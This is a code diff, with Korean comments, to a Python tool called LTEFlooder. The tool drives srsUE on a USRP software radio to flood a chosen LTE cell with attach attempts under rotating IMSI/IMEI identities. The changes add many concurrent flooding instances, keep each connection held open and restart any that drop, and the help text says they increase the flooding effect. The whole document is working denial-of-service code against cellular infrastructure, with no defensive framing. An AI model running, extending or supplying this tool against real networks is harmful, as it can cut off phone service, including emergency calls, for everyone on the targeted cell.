@@ -28,7 +28,7 @@ class LTEFlooder:
     def __init__(self, usrp_args: str, 
                  interval: float = 0.1, srsue_config: str = "srsue.conf",
                  mcc: Optional[int] = None, mnc: Optional[int] = None,
-                 earfcn: Optional[int] = None):
+                 earfcn: Optional[int] = None, instances: int = 1):
         """
         Args:
             usrp_args: USRP 장치 인자 (예: "serial=30AD123")
@@ -37,6 +37,7 @@ class LTEFlooder:
             mcc: Mobile Country Code (예: 123)
             mnc: Mobile Network Code (예: 456)
             earfcn: 주파수 채널 번호 (예: 3400)
+            instances: 동시에 실행할 프로세스 수 (기본값: 1)
         """
         self.usrp_args = usrp_args
         self.interval = interval
@@ -44,7 +45,8 @@ class LTEFlooder:
         self.mcc = mcc
         self.mnc = mnc
         self.earfcn = earfcn
-        self.process: Optional[subprocess.Popen] = None
+        self.instances = instances
+        self.processes: list[Optional[subprocess.Popen]] = []  # 여러 프로세스 관리
         self.running = False
         
         # .env 파일에서 USIM 키 로드
@@ -304,7 +306,11 @@ nas_filename = /tmp/srsue_{unique_id}_nas.pcap
                 process_exited_early = False
                 process_stderr = None
                 
-                while process.poll() is None and (time.time() - start_time) < max_wait_time:
+                # 연결 성공 후에는 타임아웃 없이 계속 실행
+                while process.poll() is None:
+                    # 연결 성공 전에는 타임아웃 체크, 성공 후에는 무한 실행
+                    if not connection_success and (time.time() - start_time) >= max_wait_time:
+                        break
                     current_time = time.time()
                     elapsed = current_time - start_time
                     
@@ -363,27 +369,20 @@ nas_filename = /tmp/srsue_{unique_id}_nas.pcap
                                     'sending nas'
                                 ])
                                 
-                                # 연결 성공 키워드 확인 (RRC 연결만 성공해도 충분 - flooding 목적)
+                                # 연결 성공 키워드 확인 (연결 성공 후 계속 유지하여 패킷 전송)
                                 if any(keyword in log_content.lower() for keyword in [
                                     'rrc connection setup complete',
                                     'rrc connected',
                                     'random access complete',  # RACH 성공 = 연결 시도 성공
-                                    'random access transmission',  # RACH 전송 시작 = 연결 시도
                                     'attached',
                                     'registered',
                                     'attach accept'
                                 ]):
-                                    connection_success = True
-                                    logger.info(f"연결 성공했습니다! (소요 시간: {elapsed:.1f}초)")
-                                    # 연결 성공 시 즉시 프로세스 종료
-                                    if process.poll() is None:
-                                        process.terminate()
-                                        try:
-                                            process.wait(timeout=1)
-                                        except subprocess.TimeoutExpired:
-                                            process.kill()
-                                            process.wait()
-                                    break
+                                    if not connection_success:
+                                        connection_success = True
+                                        logger.info(f"연결 성공했습니다! 연결을 유지하며 패킷을 계속 전송합니다. (소요 시간: {elapsed:.1f}초)")
+                                    # 연결 성공 후 종료하지 않고 계속 실행 (연결 유지)
+                                    # 프로세스는 계속 실행되어 패킷을 보냄
                                 
                                 
                         except:
@@ -446,14 +445,27 @@ nas_filename = /tmp/srsue_{unique_id}_nas.pcap
                             # stderr가 읽을 수 없는 경우 (이미 닫혔거나 seek 불가능)
                             pass
                 
-                # 프로세스가 아직 실행 중이면 종료
+                # 프로세스가 종료되었는지 확인 (while 루프를 빠져나왔으므로 프로세스가 종료됨)
+                elapsed_time = time.time() - start_time
+                
+                # 프로세스가 아직 실행 중이면 (타임아웃으로 루프를 빠져나온 경우) 종료
                 if process.poll() is None:
-                    process.terminate()
-                    try:
-                        process.wait(timeout=2)
-                    except subprocess.TimeoutExpired:
-                        process.kill()
-                        process.wait()
+                    if not connection_success:
+                        # 연결 실패 시 프로세스 종료
+                        process.terminate()
+                        try:
+                            process.wait(timeout=2)
+                        except subprocess.TimeoutExpired:
+                            process.kill()
+                            process.wait()
+                    else:
+                        # 연결 성공했는데 프로세스가 아직 실행 중이면 계속 실행
+                        # (이 경우는 거의 없지만 안전을 위해)
+                        logger.info(f"연결 유지 중... (실행 시간: {elapsed_time:.1f}초)")
+                        try:
+                            process.wait()  # 프로세스가 종료될 때까지 대기
+                        except:
+                            pass
                 
                 # 프로세스 종료 후 config 파일 삭제
                 if os.path.exists(config_path):
@@ -463,32 +475,116 @@ nas_filename = /tmp/srsue_{unique_id}_nas.pcap
                         pass
                 
                 # 결과 로깅
-                elapsed_time = time.time() - start_time
-                
                 if connection_success:
-                    logger.info(f"연결 성공 - 다음 핸드폰으로 재시작합니다...")
+                    logger.info(f"연결이 끊어졌습니다. 재연결합니다...")
                 elif process_exited_early:
                     if enb_found:
-                        logger.warning(f"eNB는 찾았지만 프로세스가 조기 종료되었습니다 (소요 시간: {elapsed_time:.1f}초) - 다음 핸드폰으로 재시작합니다...")
+                        logger.warning(f"eNB는 찾았지만 프로세스가 조기 종료되었습니다 (소요 시간: {elapsed_time:.1f}초) - 재시작합니다...")
                     else:
-                        logger.warning(f"프로세스가 조기 종료되었습니다 (소요 시간: {elapsed_time:.1f}초) - 다음 핸드폰으로 재시작합니다...")
+                        logger.warning(f"프로세스가 조기 종료되었습니다 (소요 시간: {elapsed_time:.1f}초) - 재시작합니다...")
                 else:
                     if enb_found:
-                        logger.warning(f"eNB는 찾았지만 연결에 실패했습니다 (총 소요 시간: {elapsed_time:.1f}초) - 다음 핸드폰으로 재시작합니다...")
+                        logger.warning(f"eNB는 찾았지만 연결에 실패했습니다 (총 소요 시간: {elapsed_time:.1f}초) - 재시작합니다...")
                     else:
-                        logger.warning(f"eNB를 찾지 못했습니다 (총 대기 시간: {elapsed_time:.1f}초) - 다음 핸드폰으로 재시작합니다...")
+                        logger.warning(f"eNB를 찾지 못했습니다 (총 대기 시간: {elapsed_time:.1f}초) - 재시작합니다...")
                 
-                if self.running:
-                    # interval이 0이면 즉시 재시작, 아니면 지정된 간격만큼 대기
-                    if self.interval > 0:
-                        time.sleep(self.interval)
-                    # interval이 0이면 바로 재시작 (대기 없음)
+                # 재연결 (interval 대기 없이 즉시)
+                # interval은 연결 시도 사이의 간격이므로, 연결이 끊어진 후 재연결은 즉시
                     
             except Exception as e:
                 logger.error(f"연결 시도 중 오류: {e}")
                 if self.running:
                     if self.interval > 0:
                         time.sleep(self.interval)
+    
+    def run_single_instance(self, instance_id: int):
+        """단일 인스턴스 실행 (연결 후 계속 유지)"""
+        unique_id = instance_id
+        config_path = self.create_ue_config(unique_id)
+        log_file = f"srsue_flooding_{instance_id}.log"
+        
+        try:
+            logger.info(f"인스턴스 {instance_id} 시작 (IMSI 범위: {unique_id})")
+            cmd = [
+                "srsue",
+                config_path,
+                "--log.filename", log_file,
+                "--log.all_level", "info"
+            ]
+            
+            kwargs = {
+                'stdout': subprocess.PIPE,
+                'stderr': subprocess.PIPE,
+            }
+            if hasattr(os, 'setsid'):
+                kwargs['preexec_fn'] = os.setsid
+            elif sys.platform == 'darwin':
+                kwargs['start_new_session'] = False
+            
+            process = subprocess.Popen(cmd, **kwargs)
+            return process, config_path
+            
+        except Exception as e:
+            logger.error(f"인스턴스 {instance_id} 시작 오류: {e}")
+            return None, config_path
+    
+    def run_multiple_instances(self):
+        """여러 프로세스를 동시에 실행 (각각 다른 IMSI/IMEI 사용)"""
+        import threading
+        
+        logger.info(f"{self.instances}개의 인스턴스를 동시에 실행합니다...")
+        
+        # 각 인스턴스에 대한 프로세스와 설정 파일 경로 저장
+        instance_data = []
+        
+        # 모든 인스턴스 시작
+        for i in range(1, self.instances + 1):
+            process, config_path = self.run_single_instance(i)
+            if process:
+                instance_data.append({
+                    'instance_id': i,
+                    'process': process,
+                    'config_path': config_path
+                })
+                self.processes.append(process)
+                # 각 인스턴스 사이에 약간의 지연 (USRP 충돌 방지)
+                if i < self.instances:
+                    time.sleep(0.5)
+        
+        logger.info(f"{len(instance_data)}개의 인스턴스가 실행 중입니다.")
+        
+        # 모든 프로세스가 종료될 때까지 대기
+        try:
+            while self.running:
+                # 종료된 프로세스 확인 및 재시작
+                for data in instance_data[:]:
+                    if data['process'].poll() is not None:
+                        # 프로세스가 종료됨
+                        logger.warning(f"인스턴스 {data['instance_id']}가 종료되었습니다. 재시작합니다...")
+                        # 기존 config 파일 삭제
+                        if os.path.exists(data['config_path']):
+                            try:
+                                os.remove(data['config_path'])
+                            except:
+                                pass
+                        # 재시작
+                        new_process, new_config_path = self.run_single_instance(data['instance_id'])
+                        if new_process:
+                            # processes 리스트 업데이트
+                            if data['process'] in self.processes:
+                                idx = self.processes.index(data['process'])
+                                self.processes[idx] = new_process
+                            else:
+                                self.processes.append(new_process)
+                            data['process'] = new_process
+                            data['config_path'] = new_config_path
+                        # 각 인스턴스 사이에 약간의 지연 (USRP 충돌 방지)
+                        time.sleep(0.5)
+                
+                time.sleep(1)  # 1초마다 확인
+                
+        except KeyboardInterrupt:
+            pass
     
     def start(self):
         """Flooding 시작"""
@@ -511,10 +607,14 @@ nas_filename = /tmp/srsue_{unique_id}_nas.pcap
             target_info.append(f"MNC: {self.mnc}")
         
         target_str = ", ".join(target_info) if target_info else "기본 설정"
-        logger.info(f"LTE Flooding 시작: 간격: {self.interval}초, 대상: {target_str}")
+        logger.info(f"LTE Flooding 시작: 인스턴스 수: {self.instances}, 대상: {target_str}")
         
-        # 단일 프로세스로 실행 (매번 다른 IMSI/IMEI 사용)
-        self.run_flooding()
+        # 여러 인스턴스 실행 또는 단일 프로세스 실행
+        if self.instances > 1:
+            self.run_multiple_instances()
+        else:
+            # 단일 프로세스로 실행 (매번 다른 IMSI/IMEI 사용)
+            self.run_flooding()
     
     def stop(self):
         """Flooding 중지"""
@@ -524,43 +624,51 @@ nas_filename = /tmp/srsue_{unique_id}_nas.pcap
         logger.info("LTE Flooding 중지 중...")
         self.running = False
         
-        # 프로세스 종료 (macOS와 Linux 호환)
+        # 모든 프로세스 종료 (macOS와 Linux 호환)
+        processes_to_kill = []
         if self.process:
+            processes_to_kill.append(self.process)
+        for proc in self.processes:
+            if proc and proc.poll() is None:
+                processes_to_kill.append(proc)
+        
+        for process in processes_to_kill:
             try:
                 if sys.platform == 'darwin':
                     # macOS에서는 직접 terminate 사용
-                    self.process.terminate()
+                    process.terminate()
                 elif hasattr(os, 'killpg'):
                     # Linux에서는 프로세스 그룹으로 종료
                     try:
-                        os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
+                        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                     except (OSError, ProcessLookupError):
-                        self.process.terminate()
+                        process.terminate()
                 else:
-                    self.process.terminate()
+                    process.terminate()
                 
                 try:
-                    self.process.wait(timeout=5)
+                    process.wait(timeout=5)
                 except subprocess.TimeoutExpired:
                     # 타임아웃 시 강제 종료
                     if sys.platform == 'darwin':
-                        self.process.kill()
+                        process.kill()
                     elif hasattr(os, 'killpg'):
                         try:
-                            os.killpg(os.getpgid(self.process.pid), signal.SIGKILL)
+                            os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                         except (OSError, ProcessLookupError):
-                            self.process.kill()
+                            process.kill()
                     else:
-                        self.process.kill()
-                    self.process.wait()
+                        process.kill()
+                    process.wait()
             except Exception as e:
                 logger.error(f"프로세스 종료 오류: {e}")
                 try:
-                    self.process.kill()
+                    process.kill()
                 except:
                     pass
         
         self.process = None
+        self.processes = []
         
         # 임시 설정 파일 정리 (모든 인스턴스의 config 파일 삭제)
         import glob
@@ -608,6 +716,12 @@ def main():
         default=None,
         help="주파수 채널 번호 (EARFCN). 특정 주파수를 지정합니다. (기본값: 3400)"
     )
+    parser.add_argument(
+        "--instances",
+        type=int,
+        default=1,
+        help="동시에 실행할 프로세스 수 (기본값: 1). 여러 프로세스를 동시에 실행하여 flooding 효과를 높입니다."
+    )
     
     args = parser.parse_args()
     
@@ -616,7 +730,8 @@ def main():
         interval=args.interval,
         mcc=args.mcc,
         mnc=args.mnc,
-        earfcn=args.earfcn
+        earfcn=args.earfcn,
+        instances=args.instances
     )
     
     # 시그널 핸들러 설정
